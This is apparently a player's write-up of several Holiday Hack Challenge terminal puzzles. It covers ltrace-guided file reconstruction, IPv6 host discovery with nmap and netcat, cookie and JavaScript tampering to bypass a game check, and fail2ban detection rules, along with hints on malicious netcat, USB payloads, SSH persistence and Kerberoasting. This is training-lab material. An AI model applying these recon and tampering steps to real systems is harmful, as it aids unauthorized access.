	Toy Levels: Very Merry, Terry \
	Naughty/Nice Blockchain Assessment: Untampered \
	Candy Sweetness Gauge: Exceedingly Sugarlicious \
	Elf Jolliness Quotient:  4a6f6c6c7920456e6f7567682c204f76657274696d6520417070726f766564 \
	
	./the_critical_elf_app: error while loading shared libraries: libc.so.2: cannot open shared object file: No such file or directory \
	snowball2@ec08e1e0f4df:~$ \
	



***Hints Provided***

> GitHub Monitoring in Splunk \
> From: Fitzy Shortstack \
> Objective: 9) Splunk! \
> Between GitHub audit log and webhook event recording, you can monitor all activity in a repository, including common git commands such as git add, git status, and git commit. \
> 
> Sysmon Monitoring in Splunk \
> From: Fitzy Shortstack \
> Objective: 9) Splunk! \
> Sysmon network events don't reveal the process parent ID for example. Fortunately, we can pivot with a query to investigate process creation events once you get a process ID. \
> 
> Malicious NetCat?? \
> From: Fitzy Shortstack \
> Objective: 9) Splunk! \
> Did you know there are multiple versions of the Netcat command that can be used maliciously? nc.openbsd, for example. \




## Exif Data

This one was pretty straight forward. A document has been changed by Jack Frost and we have exiftool to help us find which one. 

I went about this by assuming Jack Frost would show up in the "last modified" first of the exiftool output. So I ran the tool on all of the available files and used grep to find Jack in the file exif data. I used -B and -A options to output enough data where I would be able to see the document Jack had edited.

I can't copy and paste from this terminal so the command is below without the prompt or success output.



	exiftool * | grep Jack -A 50 -B 50



***Hints Provided***

> 
> Coordinate Systems \
> From: Piney Sappington \
> Objective: 2) Where in the World is Caramel Santaigo? \
> Don't forget coordinate systems other than lat/long like MGRS and what3words. \
> 
> Flask Cookies \
> From: Piney Sappington \
> Objective: 2) Where in the World is Caramel Santaigo? \
> While Flask cookies can't generally be forged without the secret, they can often be decoded and read. \
> 
> OSINT Talk \
> From: Piney Sappington \
> Objective: 2) Where in the World is Caramel Santaigo? \
> Clay Moody is giving a talk about OSINT techniques right now! \


## Strace Ltrace Retrace

Tinsel Upatree nneeds some help tracing the execution of a program on Linux.

They say we'll get some useful Wireshark hints if we help, so lets go!


> ================================================================================
> 
> Please, we need your help! The cotton candy machine is broken!
> 
> We replaced the SD card in the Cranberry Pi that controls it and reinstalled the
> software. Now it's complaining that it can't find a registration file!
> 
> Perhaps you could figure out what the cotton candy software is looking for...
> 
> ================================================================================

Lets takew a look at what we're dealing with:
	
	kotton_kandy_co@41e272b1d65a:~$ ls
	make_the_candy*
	kotton_kandy_co@41e272b1d65a:~$ ./make_the_candy 
	Unable to open configuration file.
	kotton_kandy_co@41e272b1d65a:~$ 

So it can't open a configuration file. So maybe we'll need to try to find what file it wants to open and create it...

Lets use ltrace to take a look at what's happening:

	kotton_kandy_co@41e272b1d65a:~$ ltrace ./make_the_candy 
	fopen("registration.json", "r")                           = 0
	puts("Unable to open configuration fil"...Unable to open configuration file.
	)               = 35
	+++ exited (status 1) +++
	kotton_kandy_co@41e272b1d65a:~$

We can see that the program is trying to open a file called registration.json

Lets create that file and see what happens then...

	kotton_kandy_co@41e272b1d65a:~$ touch registration.json
	kotton_kandy_co@41e272b1d65a:~$ ./make_the_candy 
	Unregistered - Exiting.
	kotton_kandy_co@41e272b1d65a:~$ ltrace ./make_the_candy 
	fopen("registration.json", "r")                           = 0x556cd343d260
	getline(0x7fffb8ff0f60, 0x7fffb8ff0f68, 0x556cd343d260, 0x7fffb8ff0f68) = -1
	puts("Unregistered - Exiting."Unregistered - Exiting.
	)                           = 24
	+++ exited (status 1) +++
	kotton_kandy_co@41e272b1d65a:~$


Ok, so it must be looking for something in the file. Lets add come content and see if the ltrace output changes.

	kotton_kandy_co@828ebbf84f9d:~$ ltrace ./make_the_candy 
	fopen("registration.json", "r")                           = 0x55ce0a5f5260
	getline(0x7fffea7455c0, 0x7fffea7455c8, 0x55ce0a5f5260, 0x7fffea7455c8) = 19
	strstr("{"test":"testval"}\n", "Registration")            = nil
	getline(0x7fffea7455c0, 0x7fffea7455c8, 0x55ce0a5f5260, 0x7fffea7455c8) = -1
	puts("Unregistered - Exiting."Unregistered - Exiting.
	)                           = 24
	+++ exited (status 1) +++
	kotton_kandy_co@828ebbf84f9d:~$


Cool, so it looks like it might be looking for the string Registration. Lets add that and see what happens.

	kotton_kandy_co@828ebbf84f9d:~$ echo "Registration" > registration.json 
	kotton_kandy_co@828ebbf84f9d:~$ ltrace ./make_the_candy 
	fopen("registration.json", "r")                           = 0x558abf738260
	getline(0x7ffda5e43050, 0x7ffda5e43058, 0x558abf738260, 0x7ffda5e43058) = 13
	strstr("Registration\n", "Registration")                  = "Registration\n"
	strchr("Registration\n", ':')                             = nil
	getline(0x7ffda5e43050, 0x7ffda5e43058, 0x558abf738260, 0x7ffda5e43058) = -1
	puts("Unregistered - Exiting."Unregistered - Exiting.
	)                           = 24
	+++ exited (status 1) +++
	kotton_kandy_co@828ebbf84f9d:~$

Ok, it seems like we might have to build up the key:value pair using the ltrace output. Lets add in the : and see what it looks for then.

	kotton_kandy_co@828ebbf84f9d:~$ ltrace ./make_the_candy 
	fopen("registration.json", "r")                           = 0x5593f5b6a260
	getline(0x7ffece7577a0, 0x7ffece7577a8, 0x5593f5b6a260, 0x7ffece7577a8) = 14
	strstr("Registration:\n", "Registration")                 = "Registration:\n"
	strchr("Registration:\n", ':')                            = ":\n"
	strstr(":\n", "True")                                     = nil
	getline(0x7ffece7577a0, 0x7ffece7577a8, 0x5593f5b6a260, 0x7ffece7577a8) = -1
	puts("Unregistered - Exiting."Unregistered - Exiting.
	)                           = 24
	+++ exited (status 1) +++
	kotton_kandy_co@828ebbf84f9d:~$


Now it's looking for "True". So lets add that to make the file contents Registration:True

	kotton_kandy_co@828ebbf84f9d:~$ echo "Registration:True" > registration.json 
	kotton_kandy_co@828ebbf84f9d:~$ ltrace ./make_the_candy 
	fopen("registration.json", "r")                           = 0x55cb21c6f260
	getline(0x7ffcc4e97570, 0x7ffcc4e97578, 0x55cb21c6f260, 0x7ffcc4e97578) = 18
	strstr("Registration:True\n", "Registration")             = "Registration:True\n"
	strchr("Registration:True\n", ':')                        = ":True\n"
	strstr(":True\n", "True")                                 = "True\n"
	getline(0x7ffcc4e97570, 0x7ffcc4e97578, 0x55cb21c6f260, 0x7ffcc4e97578) = -1
	system("/bin/initialize_cotton_candy_sys"...
	
	
	Launching...

...and we did it! A  ice ribbon prints out when you finish this.

I checked the strace output at the start of this but ended up not actually using it at all. We were able to build up the required string/file contents using the ltrace output only.


***Hints Provided***

> Evil Bit RFC
> From: Tinsel Upatree
> Objective: 11) Customer Complaint Analysis
> RFC3514 defines the usage of the "Evil Bit" in IPv4 headers.
> 
> Wireshark Display Filters
> From: Tinsel Upatree
> Objective: 11) Customer Complaint Analysis
> Different from BPF capture filters, Wireshark's display filters can find text with the contains keyword - and evil bits with ip.flags.rb.


## IPv6 Sandbox

Jewel Loggins needs help getting some tools running with IPv6! The password to start the candy striper has been lost and we need to use some networking tools on an IPv6 network to find it.

ifconfig shows 2 IPv6 addresses for interface eth0, a link local address and another address.

	fe80::42:c0ff:fea8:a003/64 (A link local address)

	2604:6000:1528:cd:d55a:f8a7:d30a:2/112

The prefex for the link local is /64, whereas the prefix for the other address is /112 so theres a smaller address space to scan.

We'll start there.


There is apparently another device on the network that can help us solve our task. We don't know the address of that device though, so we should do a pingsweep. 

	nmap -sn -6 2604:6000:1528:cd:d55a:f8a7:d30a:2/112

This shows another address as up:

	2604:6000:1528:cd:d55a:f8a7:d30a:1

Lets try a port scan:

	nmap -sV -6 2604:6000:1528:cd:d55a:f8a7:d30a:1

This shows 2 ports open. We have port 22 and port 3000


Lets try using netcat to connect to port 3000 and see what it is.

	netcat -6 2604:6000:1528:cd:d55a:f8a7:d30a:1 3000

Sending some data will result in a HTTP 400 Bad Request message returning. So we have a HTTP server!

Lets use curl to send a http request and see what we get.


	curl http://[2604:6000:1528:cd:d55a:f8a7:d30a:1]:3000


The response we get indicates that a web terminal emulator is running on this port... but we can't seem to interact with it. Back to the drawing board! (I think the address we looked at is the server handing the Cranberry Pi itself)

Going back to a github page the elf pointed us to, we can see that there are some ping commands that help to find other hosts in the network. Lets try these...


	ping6 ff02::1 -c2
	ping6 ff02::2 -c2


We actually get some addresses from these. Lets check them out!

NOTE: Something interesting about these link local addresses is that we need to specify the interface, which makes sense in the context of what they are.

After trying a few we get a winner:

	nmap -sV -6 fe80::42:c0ff:fea8:a002%eth0

This host has 2 ports open. 80 and 9000.

Lets try 80 first.


curl http://[fe80::42:c0ff:fea8:a002]:80/ --interface eth0

From the output it looks like we are connected to the candy striper! It tells us to connect to the other TCP port (we found 9000 open) to get the activation code!

	netcat -6 fe80::42:c0ff:fea8:a002%eth0 9000

and the server provides us with the string "PieceOnEarth".

***Hints Provided***

> 	Ducky Script
> 	From: Jewel Loggins
> 	Objective: 5) Strange USB Device
> 	Ducky Script is the language for the USB Rubber Ducky
> 	
> 	Duck Encoder
> 	From: Jewel Loggins
> 	Objective: 5) Strange USB Device
> 	Attackers can encode Ducky Script using a duck encoder for delivery as inject.bin.
> 	
> 	Ducky RE with Mallard
> 	From: Jewel Loggins
> 	Objective: 5) Strange USB Device
> 	It's also possible the reverse engineer encoded Ducky Script using Mallard.
> 	
> 	Mitre ATT&CK™ and Ducky
> 	From: Jewel Loggins
> 	Objective: 5) Strange USB Device
> 	The MITRE ATT&CK™ tactic T1098.004 describes SSH persistence techniques through authorized keys files.



## Sleigh Music Thing

Chimney Scissorsticks has a game for us. One with involves generating music for santas sleigh. It can be played with a friend or there is a way to play alone it seems. 

Now the way to play singleplayer is to take advantage of the fact that we're dealing with an iframe when we open the Cranberry Pi terminals!

Inspect element, get the URL for the iframe, and open this is another window/tab. Create a room and use the join code in the other window/tab to join the room. Congratulations fellow loners, you are now playing alone!



This caught me for a while. There are two things that need to be done here. First, you need to change the value of a cookie. You can do this using dev tools, under the application tab. The second thing you need to do is edit a variable in the JS. Both the cookie and this variable are called "single_player_mode". I set a breakpoint in the JS and changed it in the console before allowing the JS to continue. I found that the solution wouldn't work unless the breakpoiunt was set. I set mine on line 559 and this worked. No breakpoint caused the computer not to join. What caught me here is that the cookie only seems to appear after you turn your console on. I had made otherOr at some stage when playing the game. I was looking around for ages and couldn't see any persistent variables to change.


***Hints Provided***

> Shellcode Primer Primer
> From: Chimney Scissorsticks
> Objective: 6) Shellcode Primer
> If you run into any shellcode primers at the North Pole, be sure to read the directions and the comments in the shellcode source!
> 
> Debugging Shellcode
> From: Chimney Scissorsticks
> Objective: 6) Shellcode Primer
> Also, troubleshooting shellcode can be difficult. Use the debugger step-by-step feature to watch values.
> 
> Register Stomping
> From: Chimney Scissorsticks
> Objective: 6) Shellcode Primer
> Lastly, be careful not to overwrite any register values you need to reference later on in your shellcode.


## HoHo... No

This is in Santas office.

Eve Snowshoes needs some help with fail2ban. Lets go!

> Jack is trying to break into Santa's workshop!
> 
> Santa's elves are working 24/7 to manually look through logs, identify the
> malicious IP addresses, and block them. We need your help to automate this so
> the elves can get back to making presents!
> 
> Can you configure Fail2Ban to detect and block the bad IPs?
> 
>  * You must monitor for new log entries in /var/log/hohono.log
>  * If an IP generates 10 or more failure messages within an hour then it must
>    be added to the naughty list by running naughtylist add <ip>
>         /root/naughtylist add 12.34.56.78
>  * You can also remove an IP with naughtylist del <ip>
>         /root/naughtylist del 12.34.56.78
>  * You can check which IPs are currently on the naughty list by running
>         /root/naughtylist list
> 
> You'll be rewarded if you correctly identify all the malicious IPs with a
> Fail2Ban filter in /etc/fail2ban/filter.d, an action to ban and unban in
> /etc/fail2ban/action.d, and a custom jail in /etc/fail2ban/jail.d. Don't
> add any nice IPs to the naughty list!
> 
> *** IMPORTANT NOTE! ***
> 
> Fail2Ban won't rescan any logs it has already seen. That means it won't
> automatically process the log file each time you make changes to the Fail2Ban
> config. When needed, run /root/naughtylist refresh to re-sample the log file
> and tell Fail2Ban to reprocess it


The log enteries that we're interested in are in

/var/log/hohono.log


Commands are

/root/naughtylist add 

/root/naughtylist del

/root/naughtylist list

/root/naughtylist refresh

So we have to create a fail2ban filter, action, and jail. For this i'm going to use one of kringlecons great talks https://www.youtube.com/watch?v=Fwv2-uV6e5I

We'll define a custom filter to catch anything that matches the malicious conditions given to us.

For the action we can use the /root/naughtylist program


Using grep we can take a look at the non-success and non-valid releated log messages to see what we might have to check for in our filter:

> cat /var/log/hohono.log | grep -iv 'success\|valid'

The follow examples from the end of the file are typical of the log messages we can see now:

> 113.4.68.185 sent a malformed request
> 2021-12-22 20:28:45 Login from 128.214.238.234 rejected due to unknown user name
> 2021-12-22 20:29:10 108.223.22.99 sent a malformed request
> 2021-12-22 20:29:20 Failed login from 128.214.238.234 for sparkle
> 2021-12-22 20:29:34 Login from 109.31.136.143 rejected due to unknown user name
> 2021-12-22 20:29:38 Login from 108.223.22.99 rejected due to unknown user name
> 2021-12-22 20:29:41 Login from 109.31.136.143 rejected due to unknown user name
> 2021-12-22 20:29:46 108.223.22.99 sent a malformed request
> 2021-12-22 20:29:56 113.4.68.185 sent a malformed request
> 2021-12-22 20:30:04 Login from 46.54.230.73 rejected due to unknown user name
> 2021-12-22 20:30:17 Login from 108.223.22.99 rejected due to unknown user name
> 2021-12-22 20:30:17 Login from 109.31.136.143 rejected due to unknown user name
> 2021-12-22 20:30:20 Login from 46.54.230.73 rejected due to unknown user name
> 2021-12-22 20:30:26 86.9.188.204 sent a malformed request
> 2021-12-22 20:30:31 87.210.141.78 sent a malformed request
> 2021-12-22 20:30:48 108.223.22.99 sent a malformed request
> 2021-12-22 20:30:49 Failed login from 114.161.78.129 for bow
> 2021-12-22 20:30:59 109.31.136.143 sent a malformed request
> 2021-12-22 20:31:00 Failed login from 114.161.78.129 for bubble
> 2021-12-22 20:31:04 Login from 128.214.238.234 rejected due to unknown user name
> 2021-12-22 20:31:11 109.31.136.143 sent a malformed request
> 2021-12-22 20:31:13 113.4.68.185 sent a malformed request
> 2021-12-22 20:31:13 Login from 86.9.188.204 rejected due to unknown user name
> 2021-12-22 20:31:15 33.61.62.243 sent a malformed request
> 2021-12-22 20:31:15 Login from 114.161.78.129 rejected due to unknown user name
> 2021-12-22 20:31:30 Login from 86.9.188.204 rejected due to unknown user name
> 2021-12-22 20:31:38 113.4.68.185 sent a malformed request

At this stage I'm not sure if we should be taking the "malformed requests" as malicious or not. We can assume they should be seen as malicious and include them in the filter. If we're wrong then we can just remove the reference to them later.

So there are 3 different strings we need a regex for here:

1. Failed login from SOME_IP for SOME_USER

^Failed login from <HOST> for .+$

2. Login from SOME_IP rejected due to unknown user name

^Login from <HOST> rejected due to unknown user name$

3. SOME_IP sent a malformed request

^<HOST> sent a malformed request$

The above should(?) work. We have another condition too, where we need to only block the IP if generates 10 or more failure messages in an hour.


nano /etc/fail2ban/filter.d/naughty.conf
nano /etc/fail2ban/action.d/naughty.conf
nano /etc/fail2ban/jail.d/naughty.conf


Failed login from (?&.ipv4) for .+

touch /var/log/naughty_log.log

echo "
[Definition]

failregex = ^ Failed login from <HOST> for .+$
            ^ Login from <HOST> rejected due to unknown user name$
            ^ <HOST> sent a malformed request$
            ^ Invalid heartbeat '.+' from <HOST>$

ignoreregex =
" > /etc/fail2ban/filter.d/naughty.conf


echo "
[Definition]

actionban = /root/naughtylist add <ip>
actionunban = /root/naughtylist del <ip>
" > /etc/fail2ban/action.d/naughty.conf

echo "
[Naughty_Jail]
enabled = true
findtime = 1h
maxretry = 10
dateformat = %%Y-%%m-%%d %%H:%%M:%%S
filter = naughty
action = naughty
logpath = /var/log/hohono.log

" > /etc/fail2ban/jail.d/naughty.conf

service fail2ban restart
/root/naughtylist refresh

After much playing around the above works. 

fail2ban-regex is very useful for testing your filter too.

I also had to create the log file here.

Eventually I was able to restart the fail2ban service!

Disconnects driving me insane.


The above eventually worked. This drove me INSANE. I had the wrong log file in the jail at the start so I was getting no matches. Then I had missed a type of malicious traffic. The pain this caused lol.

> *******************************************************************
> * You stopped the attacking systems! You saved our systems!
> *
> * Thank you for all of your help. You are a talented defender!
> *******************************************************************

No problem, It only cost me my sanity.

We get some hints!

> From: Eve Snowshoes
> Objective: 8) Kerberoasting on an Open Fire
> Check out Chris Davis' talk and scripts on Kerberoasting and Active Directory permissions abuse.
> 
> From: Eve Snowshoes
> Objective: 8) Kerberoasting on an Open Fire
> Learn about Kerberoasting to leverage domain credentials to get usernames and crackable hashes for service accounts.
> 
> From: Eve Snowshoes
> Objective: 8) Kerberoasting on an Open Fire
> There will be some 10.X.X.X networks in your routing tables that may be interesting. Also, consider adding -PS22,445 to your nmap scans to "fix" default probing for unprivileged scans.

